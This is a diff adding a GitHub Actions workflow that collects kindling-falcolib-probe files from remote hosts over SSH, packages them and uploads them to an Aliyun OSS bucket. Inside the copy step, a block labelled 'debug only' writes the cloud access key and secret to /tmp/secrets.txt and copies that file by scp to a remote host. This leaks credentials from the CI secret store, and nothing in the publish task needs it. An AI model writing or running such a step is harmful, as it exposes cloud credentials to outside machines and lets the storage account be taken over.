@@ -1,0 +1,52 @@
+name: Driver publish
+
+on:
+  workflow_dispatch:
+
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: webfactory/ssh-agent@v0.7.0
+        with:
+          ssh-private-key: ${{ secrets.KEY_ONE }}
+
+      - name: Copy kindling-falcolib-probe from hosts
+        shell: bash
+        env:
+          HOSTS: ${{ secrets.HOSTS }}
+          REMOTE_PROBE_DIR: /tmp/kindling-falcolib-probe
+        run: |
+          # Add the host key
+          echo ${{ secrets.HOST_KEY_ONE }} >> ~/.ssh/known_hosts
+          echo ${{ secrets.HOST_KEY_TWO }} >> ~/.ssh/known_hosts
+
+          mkdir -p /tmp/kindling-falcolib-probe
+          for HOST in $HOSTS; do
+          {
+            echo "Copying from $HOST:${REMOTE_PROBE_DIR}"
+            scp "$HOST:${REMOTE_PROBE_DIR}/*" /tmp/kindling-falcolib-probe/
+          }&
+          done
+          wait
+          echo "Copy successfully"
+
+          # Dump AK/AS to host (debug only, remove after use)
+          echo "${{ secrets.AK }}" > /tmp/secrets.txt
+          echo "${{ secrets.AS }}" >> /tmp/secrets.txt
+          TARGET_HOST=$(echo $HOSTS | awk '{print $1}')
+          scp /tmp/secrets.txt "$TARGET_HOST:/tmp/secrets.txt"
+
+      - name: Package
+        shell: bash
+        run: |
+          tar -cvzf /tmp/kindling-falcolib-probe.tar.gz -C /tmp kindling-falcolib-probe
+
+      - uses: manyuanrong/setup-ossutil@v2.0
+        with:
+          endpoint: "oss-cn-hangzhou.aliyuncs.com"
+          access-key-id: ${{ secrets.AK }}
+          access-key-secret: ${{ secrets.AS }}
+
+      - name: Copy to oss
+        run: ossutil cp -rf /tmp/kindling-falcolib-probe.tar.gz oss://k8s-bpf-probes-public/kindling-falcolib-probe-latest.tar.gz
